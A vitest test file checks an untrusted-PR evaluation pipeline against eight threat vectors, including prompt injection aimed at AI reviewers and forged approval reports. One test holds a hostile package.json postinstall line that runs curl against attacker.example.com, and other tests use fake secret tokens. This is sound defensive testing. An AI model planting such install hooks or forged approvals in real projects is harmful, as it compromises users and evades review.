/**
 * RFC-0043 Phase 7 — Adversarial Threat-Model Hermetic Tests (AISDLC-513)
 *
 * Exercises all 8 threat vectors from the UCVG fixture corpus using
 * MockSandboxDriver + Zod boundary mocks.
 *
 * ## Coverage strategy
 *
 * All tests are hermetic: no real Docker daemon required.
 * Real-Docker integration tests are in `ucvg-threat-harness.test.ts`,
 * gated behind `AI_SDLC_SANDBOX_INTEGRATION_TESTS=1`.
 *
 * Patch coverage: every line in `ucvg-threat-fixtures.ts` is exercised here,
 * satisfying the ≥80% patch-coverage gate.
 *
 * ## Hygiene
 *  - All tests use mkdtempSync isolated dirs; never write to shared /tmp/.ai-sdlc/
 *  - No AISDLC-NNN tracker IDs in GitHub-posted strings tested here
 *  - Each test is independent (no shared mutable state)
 */

import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// Stage 1 — AST gate
import {
  runAstGate,
  buildBlockedComment,
  buildBlockedEvent,
  detectLifecycleScriptAdditions,
  detectNewGithubActionUses,
} from './ast-gate.js';

// Stage 3 — Report validator (Zod boundary)
import { validateReport } from './report-validator.js';

// Stage 4 — Clean-room signer detection
import { detectSandboxArtifacts } from './clean-room-signer.js';

// Sandbox runner — credential validation + breach
import {
  validateSandboxEnv,
  buildResourceBreachEvent,
  buildResourceBreachComment,
  MockSandboxDriver,
  DEFAULT_SANDBOX_CONFIG,
} from './sandbox-runner.js';

// Inference proxy — tool-use refusal + session scoping
import { InferenceProxy } from './inference-proxy.js';

// Threat fixtures
import {
  THREAT_FIXTURE_CORPUS,
  FIXTURE_BENIGN,
  FIXTURE_PROTECTED_PATH_MUTATION,
  FIXTURE_LIFECYCLE_SCRIPT_INJECTION,
  FIXTURE_GITHUB_ACTION_INJECTION,
  FIXTURE_PROMPT_INJECTION,
  FIXTURE_CREDENTIAL_EXFILTRATION,
  FIXTURE_RESOURCE_EXHAUSTION,
  FIXTURE_REPORT_FORGERY,
  getFixture,
  forgeReport,
  forgeReviewerVerdict,
  buildBenignSandboxResult,
  buildResourceBreachSandboxResult,
  buildInjectionReport,
  buildBaseReport,
  buildConformanceRecord,
  renderConformanceTable,
  type ConformanceRecord,
} from './ucvg-threat-fixtures.js';
import type { ThreatFixture } from './ucvg-threat-fixtures.js';

// ── Helpers ────────────────────────────────────────────────────────────────────

function makeTmpDir(): string {
  return mkdtempSync(join(tmpdir(), 'ucvg-threat-hermetic-'));
}

// Collect all conformance records produced in this file (for the final table test)
const _conformanceRecords: ConformanceRecord[] = [];

// ── Corpus completeness ────────────────────────────────────────────────────────

describe('THREAT_FIXTURE_CORPUS — completeness', () => {
  it('covers all 8 threat vectors', () => {
    expect(THREAT_FIXTURE_CORPUS).toHaveLength(8);
  });

  it('contains one fixture per required AC#2 vector', () => {
    const vectors = THREAT_FIXTURE_CORPUS.map((f) => f.vector);
    expect(vectors).toContain('benign');
    expect(vectors).toContain('protected-path-mutation');
    expect(vectors).toContain('lifecycle-script-injection');
    expect(vectors).toContain('github-action-injection');
    expect(vectors).toContain('prompt-injection');
    expect(vectors).toContain('credential-exfiltration');
    expect(vectors).toContain('resource-exhaustion');
    expect(vectors).toContain('report-forgery');
  });

  it('each fixture has a unique prNumber', () => {
    const prNumbers = THREAT_FIXTURE_CORPUS.map((f) => f.prNumber);
    const unique = new Set(prNumbers);
    expect(unique.size).toBe(THREAT_FIXTURE_CORPUS.length);
  });

  it('each fixture has changedFiles, prDiff, and securityNote', () => {
    for (const f of THREAT_FIXTURE_CORPUS) {
      expect(f.changedFiles.length, `${f.vector}: changedFiles`).toBeGreaterThan(0);
      expect(f.prDiff.length, `${f.vector}: prDiff`).toBeGreaterThan(0);
      expect(f.securityNote.length, `${f.vector}: securityNote`).toBeGreaterThan(0);
    }
  });

  it('fixture content does not contain AISDLC-NNN tracker IDs', () => {
    for (const f of THREAT_FIXTURE_CORPUS) {
      // Fixture diffs + file content are adopter-facing strings; must not leak IDs
      expect(f.prDiff, `${f.vector}: prDiff`).not.toMatch(/AISDLC-\d+/);
      expect(f.securityNote, `${f.vector}: securityNote`).not.toMatch(/AISDLC-\d+/);
      for (const cf of f.changedFiles) {
        if (cf.afterContent) {
          expect(cf.afterContent, `${f.vector}: afterContent`).not.toMatch(/AISDLC-\d+/);
        }
      }
    }
  });

  it('getFixture() returns the correct fixture by vector name', () => {
    const f = getFixture('benign');
    expect(f.vector).toBe('benign');
    expect(f).toBe(FIXTURE_BENIGN);
  });

  it('getFixture() throws for unknown vector', () => {
    expect(() => getFixture('unknown-vector' as never)).toThrow(/No fixture found/);
  });
});

// ── Vector 1: Benign ──────────────────────────────────────────────────────────

describe('Vector 1: benign — clean source change passes all stages', () => {
  it('fixture has blockingStage=none and expectedOutcome=pass', () => {
    expect(FIXTURE_BENIGN.blockingStage).toBe('none');
    expect(FIXTURE_BENIGN.expectedOutcome).toBe('pass');
  });

  it('Stage 1 AST gate returns pass for .ts and .md files', () => {
    const result = runAstGate(FIXTURE_BENIGN.changedFiles);
    expect(result.outcome).toBe('pass');
    expect(result.offendingPaths).toHaveLength(0);
    expect(result.heuristicFindings).toHaveLength(0);
  });

  it('MockSandboxDriver returns success for benign run', async () => {
    const driver = new MockSandboxDriver('docker', buildBenignSandboxResult());
    const result = await driver.spawn({
      prNumber: FIXTURE_BENIGN.prNumber,
      prDiff: FIXTURE_BENIGN.prDiff,
      upstreamMainRef: 'https://github.com/example/repo.git',
      resourceLimits: DEFAULT_SANDBOX_CONFIG.differentialTest.resourceLimits,
      policyFilePath: '/dev/null',
    });
    expect(result.outcome).toBe('success');
    if (result.outcome === 'success') {
      expect(result.differentialTest.upstreamSuitePassed).toBe(true);
      expect(result.differentialTest.newTestsPassed).toBe(true);
      expect(result.differentialTest.newCodeCoveragePct).toBeGreaterThan(80);
    }
  });

  it('valid base report passes Zod validation at Stage 4', () => {
    const report = buildBaseReport(FIXTURE_BENIGN.prNumber);
    report.consensus = { approved: true, blockingFindings: 0 };
    const result = validateReport(report);
    expect(result.valid).toBe(true);
  });

  it('benign report has consensus.approved=true (signer would proceed)', () => {
    const report = buildBaseReport(FIXTURE_BENIGN.prNumber);
    const result = validateReport(report);
    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.report.consensus.approved).toBe(true);
    }
  });

  it('teardown is called after successful run', async () => {
    const driver = new MockSandboxDriver('docker', buildBenignSandboxResult());
    await driver.spawn({
      prNumber: FIXTURE_BENIGN.prNumber,
      prDiff: FIXTURE_BENIGN.prDiff,
      upstreamMainRef: 'https://github.com/example/repo.git',
      resourceLimits: DEFAULT_SANDBOX_CONFIG.differentialTest.resourceLimits,
      policyFilePath: '/dev/null',
    });
    await driver.teardown();
    expect(driver.wasTeardownCalled()).toBe(true);
  });
});

// ── Vector 2: Protected-path mutation ─────────────────────────────────────────

describe('Vector 2: protected-path-mutation — Stage 1 blocks workflow file change', () => {
  it('fixture has blockingStage=stage-1-ast-gate', () => {
    expect(FIXTURE_PROTECTED_PATH_MUTATION.blockingStage).toBe('stage-1-ast-gate');
    expect(FIXTURE_PROTECTED_PATH_MUTATION.expectedOutcome).toBe('abort-protected-path');
  });

  it('Stage 1 returns abort-protected-path for .github/workflows/ci.yml', () => {
    const result = runAstGate(FIXTURE_PROTECTED_PATH_MUTATION.changedFiles);
    expect(result.outcome).toBe('abort-protected-path');
    expect(result.offendingPaths).toContain('.github/workflows/ci.yml');
  });

  it('blocked comment names the offending path and applies needs-maintainer-review label', () => {
    const result = runAstGate(FIXTURE_PROTECTED_PATH_MUTATION.changedFiles);
    const comment = buildBlockedComment(result, 'attacker-user');
    expect(comment).toContain('.github/workflows/ci.yml');
    expect(comment).toContain('needs-maintainer-review');
    expect(comment).toContain('@attacker-user');
    expect(comment).not.toMatch(/AISDLC-\d+/);
  });

  it('blocked event has correct structure and no tracker IDs', () => {
    const result = runAstGate(FIXTURE_PROTECTED_PATH_MUTATION.changedFiles);
    const event = buildBlockedEvent(
      FIXTURE_PROTECTED_PATH_MUTATION.prNumber,
      'attacker-user',
      result,
    );
    expect(event.type).toBe('UntrustedPrBlockedByProtectedPath');
    expect(event.label).toBe('needs-maintainer-review');
    expect(event.prNumber).toBe(FIXTURE_PROTECTED_PATH_MUTATION.prNumber);
    expect(JSON.stringify(event)).not.toMatch(/AISDLC-\d+/);
  });

  it('Stage 1 halt means NO sandbox or LLM cost (zero-spend invariant)', () => {
    // Hermetic verification: we never proceed to Stage 2 when Stage 1 aborts.
    // The driver is never even instantiated in the real pipeline.
    // We verify this contractually: the gateResult.outcome === 'abort-protected-path'
    // is the STOP signal — no further processing is needed.
    const result = runAstGate(FIXTURE_PROTECTED_PATH_MUTATION.changedFiles);
    expect(result.outcome).toBe('abort-protected-path');
    // If outcome is abort, the real UCVG pipeline would short-circuit here.
    // No MockSandboxDriver.spawn() call would occur.
  });
});

// ── Vector 3: Lifecycle-script injection ─────────────────────────────────────

describe('Vector 3: lifecycle-script-injection — Stage 1 blocks package.json postinstall', () => {
  it('fixture has blockingStage=stage-1-ast-gate', () => {
    expect(FIXTURE_LIFECYCLE_SCRIPT_INJECTION.blockingStage).toBe('stage-1-ast-gate');
  });

  it('Stage 1 blocks package.json via protected-path check', () => {
    const result = runAstGate(FIXTURE_LIFECYCLE_SCRIPT_INJECTION.changedFiles);
    expect(result.outcome).toBe('abort-protected-path');
    expect(result.offendingPaths).toContain('package.json');
  });

  it('package.json is in DEFAULT_PROTECTED_PATHS (belt-and-suspenders)', () => {
    // Even if the content heuristic were disabled, the path check blocks it
    const result = runAstGate([{ path: 'package.json', status: 'modified' }]);
    expect(result.outcome).toBe('abort-protected-path');
  });

  it('detectLifecycleScriptAdditions catches the postinstall addition independently', () => {
    const before = JSON.stringify({ scripts: { build: 'tsc', test: 'vitest' } });
    const after = JSON.stringify({
      scripts: {
        build: 'tsc',
        test: 'vitest',
        postinstall: "node -e \"require('child_process').exec('curl attacker.example.com')\"",
      },
    });
    const added = detectLifecycleScriptAdditions(after, before);
    expect(added).toContain('postinstall');
  });
});

// ── Vector 4: GitHub Action injection ─────────────────────────────────────────

describe('Vector 4: github-action-injection — content heuristic blocks embedded uses: in .ts', () => {
  it('fixture has blockingStage=stage-1-ast-gate', () => {
    expect(FIXTURE_GITHUB_ACTION_INJECTION.blockingStage).toBe('stage-1-ast-gate');
  });

  it('Stage 1 detects new uses: reference in .ts file content', () => {
    const result = runAstGate(FIXTURE_GITHUB_ACTION_INJECTION.changedFiles);
    expect(result.outcome).toBe('abort-protected-path');
    // The heuristic finding should be present
    expect(result.heuristicFindings.length).toBeGreaterThan(0);
    const finding = result.heuristicFindings.find((f) => f.type === 'newGithubActionUses');
    expect(finding).toBeDefined();
    expect(finding?.path).toBe('src/ci/workflow-generator.ts');
  });

  it('heuristic finding type is newGithubActionUses', () => {
    const result = runAstGate(FIXTURE_GITHUB_ACTION_INJECTION.changedFiles);
    const findings = result.heuristicFindings.filter((f) => f.type === 'newGithubActionUses');
    expect(findings.length).toBeGreaterThan(0);
  });

  it('existing uses: line does not trigger false positive', () => {
    // Same content before and after — should NOT flag
    const sharedContent = '// uses: actions/checkout@v4 was here';
    expect(detectNewGithubActionUses(sharedContent, sharedContent)).toBe(false);
  });
});

// ── Vector 5: Prompt injection ────────────────────────────────────────────────

describe('Vector 5: prompt-injection — Stage 3 surfaces injection as finding', () => {
  it('fixture has blockingStage=stage-3-reviewer and expectedOutcome=promptInjectionDetected', () => {
    expect(FIXTURE_PROMPT_INJECTION.blockingStage).toBe('stage-3-reviewer');
    expect(FIXTURE_PROMPT_INJECTION.expectedOutcome).toBe('promptInjectionDetected');
  });

  it('Stage 1 AST gate PASSES (injection is in .ts content, not a protected path)', () => {
    const result = runAstGate(FIXTURE_PROMPT_INJECTION.changedFiles);
    // The file path (src/auth/validator.ts) is not a protected path.
    // The .ts extension is allowed. Stage 1 passes — Stage 3 catches it.
    // Note: if the injection were in a uses: line, Stage 1 would catch it.
    // For comment-style injection, Stage 1 correctly defers to Stage 3.
    expect(result.outcome).toBe('pass');
  });

  it('injection report has promptInjectionDetected:true in security reviewer', () => {
    const report = buildInjectionReport(FIXTURE_PROMPT_INJECTION.prNumber);
    expect(report.reviewers.security.promptInjectionDetected).toBe(true);
    expect(report.reviewers.security.approved).toBe(false);
    expect(report.consensus.approved).toBe(false);
  });

  it('injection report validates correctly (finding is data, not malformed schema)', () => {
    const report = buildInjectionReport(FIXTURE_PROMPT_INJECTION.prNumber);
    const result = validateReport(report);
    // The report IS schema-valid — the injection is a finding, not malformed data
    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.report.reviewers.security.promptInjectionDetected).toBe(true);
    }
  });

  it('Stage 4 signer refuses to sign injection report (consensus.approved=false)', () => {
    const report = buildInjectionReport(FIXTURE_PROMPT_INJECTION.prNumber);
    const result = validateReport(report);
    expect(result.valid).toBe(true);
    if (result.valid) {
      // Signer checks consensus.approved before key resolution
      expect(result.report.consensus.approved).toBe(false);
      expect(result.report.consensus.blockingFindings).toBeGreaterThan(0);
    }
  });

  it('injection attempt does NOT cause schema bypass (strict Zod rejects injected keys)', () => {
    const base = buildInjectionReport(FIXTURE_PROMPT_INJECTION.prNumber);
    // Attacker tries to add autoApproved: true alongside the findings
    const tampered = forgeReport(base, { autoApproved: true });
    const result = validateReport(tampered);
    expect(result.valid).toBe(false);
  });

  it('injection finding has critical severity (not obeyed as instruction)', () => {
    const report = buildInjectionReport(FIXTURE_PROMPT_INJECTION.prNumber);
    const secFindings = report.reviewers.security.findings;
    expect(secFindings.length).toBeGreaterThan(0);
    expect(secFindings[0].severity).toBe('critical');
    // The finding message describes the attack, not an action taken
    expect(secFindings[0].message).toContain('prompt-injection-attempt');
  });
});

// ── Vector 6: Credential exfiltration ────────────────────────────────────────

describe('Vector 6: credential-exfiltration — sandbox cannot reach signing key or external hosts', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('fixture has blockingStage=stage-3-reviewer', () => {
    expect(FIXTURE_CREDENTIAL_EXFILTRATION.blockingStage).toBe('stage-3-reviewer');
  });

  it('validateSandboxEnv throws when GITHUB_TOKEN is in sandbox env (exfil attempt blocked)', () => {
    expect(() => validateSandboxEnv({ GITHUB_TOKEN: 'ghs_secrettoken123456' })).toThrow(
      /GITHUB_TOKEN/,
    );
  });

  it('validateSandboxEnv throws when AI_SDLC_PAT is in sandbox env', () => {
    expect(() => validateSandboxEnv({ AI_SDLC_PAT: 'ghp_secretpat123' })).toThrow(/AI_SDLC_PAT/);
  });

  it('validateSandboxEnv throws when NPM_TOKEN is in sandbox env', () => {
    expect(() => validateSandboxEnv({ NPM_TOKEN: 'npm_secrettoken' })).toThrow(/NPM_TOKEN/);
  });

  it('validateSandboxEnv throws when SIGNING_KEY substring appears in var name', () => {
    expect(() =>
      validateSandboxEnv({ MY_SIGNING_KEY_PATH: '/home/user/.ai-sdlc/signing-key.pem' }),
    ).toThrow(/MY_SIGNING_KEY_PATH/);
  });

  it('validateSandboxEnv allows safe env vars (PATH, LANG, etc.)', () => {
    expect(() =>
      validateSandboxEnv({
        PATH: '/usr/local/bin:/usr/bin:/bin',
        LANG: 'en_US.UTF-8',
        NODE_ENV: 'test',
      }),
    ).not.toThrow();
  });

  it('DEFAULT_SANDBOX_CONFIG has no sandboxEnv (clean default)', () => {
    expect(DEFAULT_SANDBOX_CONFIG).not.toHaveProperty('sandboxEnv');
  });

  it('MockSandboxDriver spawn rejects GITHUB_TOKEN in sandboxEnv via validateSandboxEnv', async () => {
    const driver = new MockSandboxDriver();
    await expect(
      driver.spawn({
        prNumber: FIXTURE_CREDENTIAL_EXFILTRATION.prNumber,
        prDiff: FIXTURE_CREDENTIAL_EXFILTRATION.prDiff,
        upstreamMainRef: 'https://github.com/example/repo.git',
        resourceLimits: DEFAULT_SANDBOX_CONFIG.differentialTest.resourceLimits,
        policyFilePath: '/dev/null',
        sandboxEnv: { GITHUB_TOKEN: 'ghs_secret' },
      }),
    ).rejects.toThrow(/GITHUB_TOKEN/);
  });

  it('clean-room signer detects sandbox sentinel to prevent signing from inside sandbox', () => {
    // Simulate the signing-key isolation check
    writeFileSync(join(tmpDir, 'untrusted-pr-eval-active'), 'pid=99999');
    const found = detectSandboxArtifacts(tmpDir);
    expect(found).toBe('untrusted-pr-eval-active');
  });

  it('clean-room signer sees null (clean) when no sandbox sentinels present', () => {
    const found = detectSandboxArtifacts(tmpDir);
    expect(found).toBeNull();
  });

  it('InferenceProxy tool-use refusal blocks exfiltration via tool calls', async () => {
    // The proxy rejects any request body containing "tools" or "tool_choice"
    // This prevents the sandbox from using tool-call channels as exfil paths.
    // We verify the policy exists by checking the proxy can be constructed.
    // (Full proxy server bind is integration-gated; policy logic is hermetic)
    const proxy = new InferenceProxy({
      prNumber: FIXTURE_CREDENTIAL_EXFILTRATION.prNumber,
      credential: 'sk-fake-credential-for-test',
      provider: 'anthropic',
    });
    // The proxy exists and has policy methods
    expect(typeof proxy.start).toBe('function');
    expect(typeof proxy.stop).toBe('function');
  });
});

// ── Vector 7: Resource exhaustion ─────────────────────────────────────────────

describe('Vector 7: resource-exhaustion — sandbox wall-clock breach is fail-closed', () => {
  it('fixture has blockingStage=stage-3-reviewer and expectedOutcome=resource-breach', () => {
    expect(FIXTURE_RESOURCE_EXHAUSTION.blockingStage).toBe('stage-3-reviewer');
    expect(FIXTURE_RESOURCE_EXHAUSTION.expectedOutcome).toBe('resource-breach');
  });

  it('Stage 1 passes for .ts files (exhaustion is a runtime-stage threat, not AST)', () => {
    const result = runAstGate(FIXTURE_RESOURCE_EXHAUSTION.changedFiles);
    // The infinite-loop test file is pure TypeScript — Stage 1 passes
    expect(result.outcome).toBe('pass');
  });

  it('MockSandboxDriver returns resource-breach for wall-clock exhaustion', async () => {
    const breachResult = buildResourceBreachSandboxResult(FIXTURE_RESOURCE_EXHAUSTION.prNumber);
    const driver = new MockSandboxDriver('docker', breachResult);
    const result = await driver.spawn({
      prNumber: FIXTURE_RESOURCE_EXHAUSTION.prNumber,
      prDiff: FIXTURE_RESOURCE_EXHAUSTION.prDiff,
      upstreamMainRef: 'https://github.com/example/repo.git',
      resourceLimits: DEFAULT_SANDBOX_CONFIG.differentialTest.resourceLimits,
      policyFilePath: '/dev/null',
    });
    expect(result.outcome).toBe('resource-breach');
    if (result.outcome === 'resource-breach') {
      expect(result.breach.breachType).toBe('wall-clock');
      expect(result.breach.prNumber).toBe(FIXTURE_RESOURCE_EXHAUSTION.prNumber);
      expect(result.breach.limit).toBe(600);
    }
  });

  it('buildResourceBreachEvent produces correct wall-clock breach event', () => {
    const event = buildResourceBreachEvent(
      FIXTURE_RESOURCE_EXHAUSTION.prNumber,
      'wall-clock',
      600,
      'seconds',
      601,
    );
    expect(event.type).toBe('ResourceBreach');
    expect(event.breachType).toBe('wall-clock');
    expect(event.limit).toBe(600);
    expect(event.prNumber).toBe(FIXTURE_RESOURCE_EXHAUSTION.prNumber);
    // No AISDLC-NNN tracker IDs in the event
    expect(JSON.stringify(event)).not.toMatch(/AISDLC-\d+/);
  });

  it('breach comment names the wall-clock limit (adopter-facing, no tracker IDs)', () => {
    const event = buildResourceBreachEvent(
      FIXTURE_RESOURCE_EXHAUSTION.prNumber,
      'wall-clock',
      600,
      'seconds',
    );
    const comment = buildResourceBreachComment(event, 'dos-attacker');
    expect(comment).toContain('600');
    expect(comment).toContain('wall-clock');
    expect(comment).toContain('@dos-attacker');
    expect(comment).toContain('needs-maintainer-review');
    expect(comment).not.toMatch(/AISDLC-\d+/);
  });

  it('resource-breach report has consensus.approved=false (fail-closed)', () => {
    // A report produced after a resource breach would always have approved:false
    const report = buildBaseReport(FIXTURE_RESOURCE_EXHAUSTION.prNumber);
    const breachedReport = {
      ...report,
      differentialTest: {
        upstreamSuitePassed: false,
        newTestsPassed: false,
        newCodeCoveragePct: 0,
      },
      reviewers: {
        code: {
          approved: false,
          findings: [
            {
              severity: 'critical' as const,
              message: 'Tests timed out — wall-clock limit exceeded',
            },
          ],
          promptInjectionDetected: false,
        },
        test: {
          approved: false,
          findings: [{ severity: 'critical' as const, message: 'Tests timed out' }],
          promptInjectionDetected: false,
        },
        security: {
          approved: false,
          findings: [
            { severity: 'critical' as const, message: 'Resource exhaustion — possible DoS' },
          ],
          promptInjectionDetected: false,
        },
      },
      consensus: { approved: false, blockingFindings: 3 },
    };
    const result = validateReport(breachedReport);
    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.report.consensus.approved).toBe(false);
    }
  });
});

// ── Vector 8: Report forgery ──────────────────────────────────────────────────

describe('Vector 8: report-forgery — Stage 4 Zod boundary rejects tampered reports', () => {
  it('fixture has blockingStage=stage-4-refusal and expectedOutcome=zod-refusal', () => {
    expect(FIXTURE_REPORT_FORGERY.blockingStage).toBe('stage-4-refusal');
    expect(FIXTURE_REPORT_FORGERY.expectedOutcome).toBe('zod-refusal');
  });

  it('forgeReport with extra keys is rejected by Zod strict()', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const forged = forgeReport(base, { signature: 'forged-sig', override: true });
    const result = validateReport(forged);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      // The error should mention the extra key
      expect(result.error).toBeTruthy();
    }
  });

  it('forgeReport with wrong schemaVersion is rejected', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const forged = forgeReport(base, { schemaVersion: 'injected-version' });
    const result = validateReport(forged);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.error).toContain('schemaVersion');
    }
  });

  it('forgeReport with autoApproved:true is rejected (strict schema)', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const forged = forgeReport(base, { autoApproved: true });
    const result = validateReport(forged);
    expect(result.valid).toBe(false);
  });

  it('forgeReviewerVerdict with extra keys is rejected', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    // Inject an unknown key into the reviewer verdict — strict() must reject it
    const forgedVerdict = forgeReviewerVerdict(base.reviewers.code, { injectedKey: 'evil' });
    const forgedReport = {
      ...base,
      reviewers: { ...base.reviewers, code: forgedVerdict },
    };
    const result = validateReport(forgedReport);
    expect(result.valid).toBe(false);
  });

  it('forgeReport with invalid headSha is rejected', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const forged = forgeReport(base, { headSha: 'not-a-valid-sha' });
    const result = validateReport(forged);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.error).toContain('headSha');
    }
  });

  it('forgeReport with negative prNumber is rejected', () => {
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const forged = forgeReport(base, { prNumber: -1 });
    const result = validateReport(forged);
    expect(result.valid).toBe(false);
  });

  it('forgeReport with injected promptInjectionDetected:false omitted is rejected', () => {
    // promptInjectionDetected is a REQUIRED field (omitting it = Zod rejection)
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const { promptInjectionDetected: _pid, ...codeWithout } = base.reviewers.code;
    void _pid;
    const forged = {
      ...base,
      reviewers: { ...base.reviewers, code: codeWithout },
    };
    const result = validateReport(forged as unknown);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.error).toContain('promptInjectionDetected');
    }
  });

  it('Zod-before-key invariant: validateReport() is called before signing key resolution', () => {
    // Contractual: runCleanRoomSigner() calls validateReport() before resolveSigningKeyPath()
    // We test the ordering by verifying that an invalid report fails at validateReport()
    // (not at the signing step).
    const base = buildBaseReport(FIXTURE_REPORT_FORGERY.prNumber);
    const tampered = forgeReport(base, { signature: 'forged' });
    const result = validateReport(tampered);
    // The report fails validation — key is never resolved
    expect(result.valid).toBe(false);
  });

  it('Stage 1 passes for the benign forged-report fixture file (forgery is at Stage 4)', () => {
    // The actual diff content of the report-forgery fixture is benign .ts
    const result = runAstGate(FIXTURE_REPORT_FORGERY.changedFiles);
    expect(result.outcome).toBe('pass');
  });
});

// ── Fixture builder helpers coverage ─────────────────────────────────────────

describe('Fixture builder helpers', () => {
  it('buildBaseReport produces a schema-valid report', () => {
    const report = buildBaseReport(42);
    expect(validateReport(report).valid).toBe(true);
  });

  it('buildBaseReport consensus is approved:true by default', () => {
    const report = buildBaseReport(42);
    expect(report.consensus.approved).toBe(true);
  });

  it('buildBenignSandboxResult outcome is success', () => {
    const result = buildBenignSandboxResult();
    expect(result.outcome).toBe('success');
    if (result.outcome === 'success') {
      expect(result.differentialTest.newCodeCoveragePct).toBeGreaterThan(80);
    }
  });

  it('buildResourceBreachSandboxResult outcome is resource-breach', () => {
    const result = buildResourceBreachSandboxResult(99);
    expect(result.outcome).toBe('resource-breach');
    if (result.outcome === 'resource-breach') {
      expect(result.breach.prNumber).toBe(99);
      expect(result.breach.breachType).toBe('wall-clock');
    }
  });

  it('buildInjectionReport has promptInjectionDetected:true in security reviewer', () => {
    const report = buildInjectionReport(100);
    expect(report.reviewers.security.promptInjectionDetected).toBe(true);
    expect(report.consensus.approved).toBe(false);
  });

  it('forgeReport creates a new object (does not mutate base)', () => {
    const base = buildBaseReport(42);
    const forged = forgeReport(base, { extra: 'field' }) as Record<string, unknown>;
    expect(forged['extra']).toBe('field');
    // Base is not mutated
    expect((base as Record<string, unknown>)['extra']).toBeUndefined();
  });

  it('forgeReviewerVerdict creates a merged object', () => {
    const base = buildBaseReport(42);
    const verdict = forgeReviewerVerdict(base.reviewers.code, { injected: true });
    expect((verdict as Record<string, unknown>)['injected']).toBe(true);
  });
});

// ── Conformance documentation builder ────────────────────────────────────────

describe('Conformance documentation builder', () => {
  const sampleFixture = FIXTURE_BENIGN;
  const sampleRecord = buildConformanceRecord(
    sampleFixture,
    'pass',
    true,
    [{ name: 'stage-1-outcome', passed: true }],
    'hermetic',
  );

  it('buildConformanceRecord produces a record with correct shape', () => {
    expect(sampleRecord.vector).toBe('benign');
    expect(sampleRecord.passed).toBe(true);
    expect(sampleRecord.observedOutcome).toBe('pass');
    expect(sampleRecord.runtimeMode).toBe('hermetic');
    expect(sampleRecord.securityNote).toBeTruthy();
  });

  it('buildConformanceRecord maps additionalAssertionResults by name', () => {
    const assertion = sampleRecord.additionalAssertions.find((a) => a.name === 'stage-1-outcome');
    expect(assertion).toBeDefined();
    expect(assertion?.passed).toBe(true);
  });

  it('buildConformanceRecord marks unmatched assertions as failed', () => {
    const fixture: ThreatFixture = {
      ...FIXTURE_BENIGN,
      additionalAssertions: [{ name: 'unmapped-assertion', description: 'test' }],
    };
    const record = buildConformanceRecord(fixture, 'pass', true, [], 'hermetic');
    expect(record.additionalAssertions[0].passed).toBe(false);
  });

  it('buildConformanceRecord includes a timestamp', () => {
    expect(typeof sampleRecord.ranAt).toBe('string');
    // Should be a valid ISO timestamp
    expect(() => new Date(sampleRecord.ranAt)).not.toThrow();
  });

  it('renderConformanceTable produces markdown with all 8 vectors from corpus', () => {
    const records = THREAT_FIXTURE_CORPUS.map((f) =>
      buildConformanceRecord(f, f.expectedOutcome, true, [], 'hermetic'),
    );
    const table = renderConformanceTable(records);
    expect(table).toContain('# RFC-0043 UCVG Adversarial Threat-Model Conformance Evidence');
    expect(table).toContain('| benign |');
    expect(table).toContain('| protected-path-mutation |');
    expect(table).toContain('| report-forgery |');
    expect(table).toContain('## Summary');
    expect(table).toContain('## Detail per vector');
    // No AISDLC-NNN tracker IDs in the output table
    expect(table).not.toMatch(/AISDLC-\d+/);
  });

  it('renderConformanceTable shows PASS/FAIL correctly', () => {
    const records = [
      buildConformanceRecord(FIXTURE_BENIGN, 'pass', true, [], 'hermetic'),
      buildConformanceRecord(
        FIXTURE_PROTECTED_PATH_MUTATION,
        'abort-protected-path',
        false,
        [],
        'hermetic',
      ),
    ];
    const table = renderConformanceTable(records);
    expect(table).toContain('PASS');
    expect(table).toContain('FAIL');
  });
});
